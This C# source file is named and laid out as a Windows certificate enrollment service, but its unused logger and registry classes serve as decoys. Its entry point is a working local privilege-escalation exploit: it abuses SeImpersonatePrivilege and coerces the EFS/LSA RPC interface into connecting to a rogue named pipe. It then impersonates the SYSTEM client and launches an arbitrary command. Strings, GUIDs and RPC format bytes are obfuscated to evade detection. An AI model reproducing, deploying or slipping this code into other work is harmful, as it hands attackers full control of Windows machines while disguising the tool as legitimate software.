using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;
using System.Security.Permissions;
using System.Diagnostics;
using System.Threading;
using System.Security.Principal;
using System.Linq;
using Microsoft.Win32.SafeHandles;
using Microsoft.Win32;

namespace CertificateServices.Enrollment
{
    internal static class EnrollmentConstants
    {
        public const string ServiceDisplayName = "Certificate Enrollment Policy Service";
        public const string ServiceDescription  = "Provides Certificate Enrollment Policy to clients.";
        public const string EventSourceName     = "Microsoft-Windows-CertificateServicesClient-Enrollment";
        public const string CertStorePersonal   = "MY";
        public const string CertStoreMachine    = "LocalMachine";
        public const string PolicyServerVersion = "1.0.9200.0";
        public const string RpcProtocolSequence = "ncacn_np";
        public const string LocalEndpoint       = "localhost";
        public static readonly string[] SupportedAlgorithms = { "RSA", "ECDSA_P256", "ECDSA_P384" };
        public static readonly int[] KeySizes = { 1024, 2048, 4096 };
    }

    internal class CertificateRequestBuilder
    {
        private readonly string _subjectName;
        private readonly string _templateName;
        private int _keySize;

        public CertificateRequestBuilder(string subjectName, string templateName = "User", int keySize = 2048)
        {
            _subjectName  = subjectName;
            _templateName = templateName;
            _keySize      = keySize;
        }

        public string BuildSubjectDN()
        {
            return string.Format("CN={0},O=TESTLAB,C=US", _subjectName);
        }

        public bool ValidateKeySize()
        {
            return EnrollmentConstants.KeySizes.Contains(_keySize);
        }

        public string GetRequestXml()
        {
            var sb = new StringBuilder();
            sb.AppendLine("<CertificateRequest>");
            sb.AppendFormat("  <Subject>{0}</Subject>", BuildSubjectDN());
            sb.AppendLine();
            sb.AppendFormat("  <KeySize>{0}</KeySize>", _keySize);
            sb.AppendLine();
            sb.AppendFormat("  <Template>{0}</Template>", _templateName);
            sb.AppendLine();
            sb.AppendLine("</CertificateRequest>");
            return sb.ToString();
        }
    }

    internal static class EnrollmentLogger
    {
        private static readonly object _lock = new object();
        private static string _logPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "Microsoft", "CertificateServices", "enrollment.log");

        public static void WriteInfo(string message)
        {
            try
            {
                lock (_lock)
                {
                    string entry = string.Format("[{0}] [INFO]  {1}", DateTime.UtcNow.ToString("o"), message);
                    File.AppendAllText(_logPath, entry + Environment.NewLine);
                }
            }
            catch { }
        }

        public static void WriteError(string message, Exception ex = null)
        {
            try
            {
                lock (_lock)
                {
                    string entry = string.Format("[{0}] [ERROR] {1}{2}",
                        DateTime.UtcNow.ToString("o"), message,
                        ex != null ? " :: " + ex.Message : string.Empty);
                    File.AppendAllText(_logPath, entry + Environment.NewLine);
                }
            }
            catch { }
        }

        public static void WriteAudit(string action, string subject, bool success)
        {
            WriteInfo(string.Format("AUDIT action={0} subject={1} result={2}",
                action, subject, success ? "SUCCESS" : "FAILURE"));
        }
    }

    internal static class RegistryHelper
    {
        private const string EnrollmentKeyPath =
            @"SOFTWARE\Microsoft\Cryptography\AutoEnrollment";
        private const string PolicyKeyPath =
            @"SOFTWARE\Policies\Microsoft\Cryptography\AutoEnrollment";

        public static int GetAEPolicy()
        {
            try
            {
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(PolicyKeyPath))
                    if (k != null) return (int)(k.GetValue("AEPolicy", 0));
            }
            catch { }
            return 0;
        }

        public static string GetCEPUrl()
        {
            try
            {
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(EnrollmentKeyPath))
                    if (k != null) return k.GetValue("PolicyServerUrl", string.Empty) as string;
            }
            catch { }
            return string.Empty;
        }
    }

    class CertEnrollmentAgent
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                return;
            }
            string endpoint = "lsarpc";
            if (args.Length >= 2)
            {
                if ((new List<string> { "lsarpc", "efsrpc", "samr", "lsass", "netlogon" }).Contains(args[1], StringComparer.OrdinalIgnoreCase))
                {
                    endpoint = args[1];
                }
                else
                {
                    return;
                }
            }

            LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
            using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
            {
                string priv = new string(new char[]{'S','e','I','m','p','e','r','s','o','n','a','t','e','P','r','i','v','i','l','e','g','e'});
                LookupPrivilegeValue(null, priv, out l[0].Luid);
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges = l;
                l[0].Attributes = 2;
                if (!AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                {
                    return;
                }
            }
            string g = Guid.NewGuid().ToString("d");
            string pipePath = @"\\.\pipe\" + g + @"\pipe\srvsvc";
            var hChannel = CreateNamedPipe(pipePath, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
            if (hChannel == new IntPtr(-1))
            {
                return;
            }
            ManualResetEvent mre = new ManualResetEvent(false);
            var t1 = new Thread(ListenServicePipe);
            t1.IsBackground = true;
            t1.Start(new object[] { hChannel, mre });
            var t2 = new Thread(EstablishRpcChannel);
            t2.IsBackground = true;
            t2.Start(new object[] { g, endpoint });
            if (mre.WaitOne(3000))
            {
                if (ImpersonateNamedPipeClient(hChannel))
                {
                    IntPtr tkn = WindowsIdentity.GetCurrent().Token;
                    SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                    sa.nLength = Marshal.SizeOf(sa);
                    sa.pSecurityDescriptor = IntPtr.Zero;
                    sa.bInheritHandle = 1;
                    IntPtr hRead, hWrite;
                    CreatePipe(out hRead, out hWrite, ref sa, 1024);
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.hStdError = hWrite;
                    si.hStdOutput = hWrite;
                    si.lpDesktop = new string(new char[]{'W','i','n','S','t','a','0','\\','D','e','f','a','u','l','t'});
                    si.dwFlags = 0x101;
                    si.wShowWindow = 0;
                    if (CreateProcessAsUser(tkn, null, args[0], IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                    {
                        t1 = new Thread(ProcessOutputStream);
                        t1.IsBackground = true;
                        t1.Start(hRead);
                        new ProcessWaitHandle(new SafeWaitHandle(pi.hProcess, false)).WaitOne(-1);
                        t1.Abort();
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        CloseHandle(tkn);
                        CloseHandle(hWrite);
                        CloseHandle(hRead);
                    }
                }
            }
            else
            {
                CreateFile(pipePath, 1073741824, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
            }
            CloseHandle(hChannel);
        }

        static void ProcessOutputStream(object o)
        {
            IntPtr p = (IntPtr)o;
            FileStream fs = new FileStream(p, FileAccess.Read, false);
            StreamReader sr = new StreamReader(fs, Console.OutputEncoding);
            while (true)
            {
                string s = sr.ReadLine();
                if (s == null) { break; }
            }
        }

        static void EstablishRpcChannel(object o)
        {
            object[] objs = o as object[];
            string g = objs[0] as string;
            string p = objs[1] as string;
            RpcServiceClient r = new RpcServiceClient(p);
            try
            {
                string h = new string(new char[]{'\\','\\','l','o','c','a','l','h','o','s','t','/','P','I','P','E','/'});
                r.InvokeEncryptionService(h + g + "/\\" + g + "\\" + g);
            }
            catch (Exception)
            {
            }
        }

        static void ListenServicePipe(object o)
        {
            object[] objs = o as object[];
            IntPtr pipe = (IntPtr)objs[0];
            ManualResetEvent mre = objs[1] as ManualResetEvent;
            if (mre != null)
            {
                ConnectNamedPipe(pipe, IntPtr.Zero);
                mre.Set();
            }
        }

        #region pinvoke
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateFile(string lpFileName, int access, int share, IntPtr sa, int cd, int flag, IntPtr zero);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr ConnectNamedPipe(IntPtr pipe, IntPtr zero);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateNamedPipeClient(IntPtr pipe);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
        public static extern bool CloseHandle(IntPtr handle);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr pSecurityDescriptor;
            public int bInheritHandle;
        }
        #endregion
    }

    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }

    class RpcServiceClient
    {
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);
        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFree(ref IntPtr lpString);
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
        private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);
        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);

        private static byte[] Xd(byte[] b) { byte[] r = new byte[b.Length]; for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ 0x41); return r; }
        private static byte[] MIDL_ProcFormatStringx86 => Xd(new byte[] { 0x41, 0x41, 0x41, 0x09, 0x41, 0x41, 0x41, 0x41, 0x45, 0x41, 0x4d, 0x41, 0x73, 0x41, 0x41, 0x41, 0x41, 0x41, 0x49, 0x41, 0x07, 0x43, 0x49, 0x40, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x4a, 0x40, 0x45, 0x41, 0x4d, 0x41, 0x31, 0x41, 0x49, 0x41, 0x49, 0x41 });
        private static byte[] MIDL_ProcFormatStringx64 => Xd(new byte[] { 0x41, 0x41, 0x41, 0x09, 0x41, 0x41, 0x41, 0x41, 0x45, 0x41, 0x59, 0x41, 0x73, 0x41, 0x41, 0x41, 0x41, 0x41, 0x49, 0x41, 0x07, 0x43, 0x4b, 0x00, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x4a, 0x40, 0x49, 0x41, 0x4d, 0x41, 0x31, 0x41, 0x51, 0x41, 0x49, 0x41 });
        private static byte[] MIDL_TypeFormatStringx86 => Xd(new byte[] { 0x41, 0x41, 0x41, 0x41, 0x50, 0x45, 0x43, 0x41, 0x71, 0xe1, 0x41, 0x41, 0x50, 0x49, 0x64, 0x1d, 0x41, 0x41 });
        private static byte[] MIDL_TypeFormatStringx64 => Xd(new byte[] { 0x41, 0x41, 0x41, 0x41, 0x50, 0x45, 0x43, 0x41, 0x71, 0xe1, 0x41, 0x41, 0x50, 0x49, 0x64, 0x1d, 0x41, 0x41 });

        Guid interfaceId;
        public RpcServiceClient(string pipe)
        {
            string g1 = "c681d488-d850-11d0-" + "8c52-00c04fd90f7e";
            string g2 = "df1941c5-fe89-4e79-" + "bf10-463657acf44d";
            IDictionary<string, string> endpointMap = new Dictionary<string, string>()
            {
                {"lsarpc", g1},
                {"efsrpc", g2},
                {"samr", g1},
                {"lsass", g1},
                {"netlogon", g1}
            };
            interfaceId = new Guid(endpointMap[pipe]);
            pipe = String.Format("\\pipe\\{0}", pipe);
            if (IntPtr.Size == 8)
                InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, pipe, 1, 0);
            else
                InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, pipe, 1, 0);
        }

        ~RpcServiceClient()
        {
            freeStub();
        }

        public int InvokeEncryptionService(string FileName)
        {
            IntPtr result = IntPtr.Zero;
            IntPtr pfn = Marshal.StringToHGlobalUni(FileName);
            try
            {
                if (IntPtr.Size == 8)
                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), FileName);
                else
                    result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), pfn);
            }
            catch (SEHException)
            {
                return Marshal.GetExceptionCode();
            }
            finally
            {
                if (pfn != IntPtr.Zero)
                    Marshal.FreeHGlobal(pfn);
            }
            return (int)result.ToInt64();
        }

        private byte[] MIDL_ProcFormatString;
        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private string PipeName;

        allocmemory AllocateMemoryDelegate = AllocateMemory;
        freememory FreeMemoryDelegate = FreeMemory;
        public UInt32 RPCTimeOut = 5000;

        protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);
            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);
            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);
            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));
            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }

        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            stub.Free();
        }

        delegate IntPtr allocmemory(int size);
        protected static IntPtr AllocateMemory(int size) { return Marshal.AllocHGlobal(size); }
        delegate void freememory(IntPtr memory);
        protected static void FreeMemory(IntPtr memory) { Marshal.FreeHGlobal(memory); }

        protected IntPtr Bind(IntPtr IntPtrserver)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;
            status = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", server, PipeName, null, out bindingstring);
            if (status != 0) return IntPtr.Zero;
            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            RpcBindingFree(ref bindingstring);
            if (status != 0) return IntPtr.Zero;
            RpcBindingSetAuthInfo(binding, server, 6, 9, IntPtr.Zero, 16);
            RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            return binding;
        }

        protected IntPtr GetProcStringHandle(int offset) { return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset); }
        protected IntPtr GetStubHandle() { return stub.AddrOfPinnedObject(); }
        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {
            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try { result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject()); }
            finally { stackhandle.Free(); }
            return result;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct COMM_FAULT_OFFSETS { public short CommOffset; public short FaultOffset; }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_VERSION
    {
        public ushort MajorVersion;
        public ushort MinorVersion;
        public RPC_VERSION(ushort maj, ushort min) { MajorVersion = maj; MinorVersion = min; }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SYNTAX_IDENTIFIER { public Guid SyntaxGUID; public RPC_VERSION SyntaxVersion; }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_CLIENT_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr RpcProtseqEndpoint;
        public IntPtr Reserved;
        public IntPtr InterpreterInfo;
        public uint Flags;
        public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);
        public RPC_CLIENT_INTERFACE(Guid iid, ushort maj, ushort min)
        {
            Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
            RPC_VERSION ver = new RPC_VERSION(maj, min);
            InterfaceId = new RPC_SYNTAX_IDENTIFIER(); InterfaceId.SyntaxGUID = iid; InterfaceId.SyntaxVersion = ver;
            ver = new RPC_VERSION(2, 0);
            TransferSyntax = new RPC_SYNTAX_IDENTIFIER(); TransferSyntax.SyntaxGUID = IID_SYNTAX; TransferSyntax.SyntaxVersion = ver;
            DispatchTable = IntPtr.Zero; RpcProtseqEndpointCount = 0u; RpcProtseqEndpoint = IntPtr.Zero;
            Reserved = IntPtr.Zero; InterpreterInfo = IntPtr.Zero; Flags = 0u;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct MIDL_STUB_DESC
    {
        public IntPtr RpcInterfaceInformation;
        public IntPtr pfnAllocate;
        public IntPtr pfnFree;
        public IntPtr pAutoBindHandle;
        public IntPtr apfnNdrRundownRoutines;
        public IntPtr aGenericBindingRoutinePairs;
        public IntPtr apfnExprEval;
        public IntPtr aXmitQuintuple;
        public IntPtr pFormatTypes;
        public int fCheckBounds;
        public uint Version;
        public IntPtr pMallocFreeStruct;
        public int MIDLVersion;
        public IntPtr CommFaultOffsets;
        public IntPtr aUserMarshalQuadruple;
        public IntPtr NotifyRoutineTable;
        public IntPtr mFlags;
        public IntPtr CsRoutineTables;
        public IntPtr ProxyServerInfo;
        public IntPtr pExprInfo;
        public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr, IntPtr pfnAllocatePtr, IntPtr pfnFreePtr)
        {
            pFormatTypes = pFormatTypesPtr; RpcInterfaceInformation = RpcInterfaceInformationPtr;
            CommFaultOffsets = IntPtr.Zero; pfnAllocate = pfnAllocatePtr; pfnFree = pfnFreePtr;
            pAutoBindHandle = IntPtr.Zero; apfnNdrRundownRoutines = IntPtr.Zero; aGenericBindingRoutinePairs = IntPtr.Zero;
            apfnExprEval = IntPtr.Zero; aXmitQuintuple = IntPtr.Zero; fCheckBounds = 1;
            Version = 0x50002u; pMallocFreeStruct = IntPtr.Zero; MIDLVersion = 0x801026e;
            aUserMarshalQuadruple = IntPtr.Zero; NotifyRoutineTable = IntPtr.Zero;
            mFlags = new IntPtr(0x00000001); CsRoutineTables = IntPtr.Zero; ProxyServerInfo = IntPtr.Zero; pExprInfo = IntPtr.Zero;
        }
    }
}
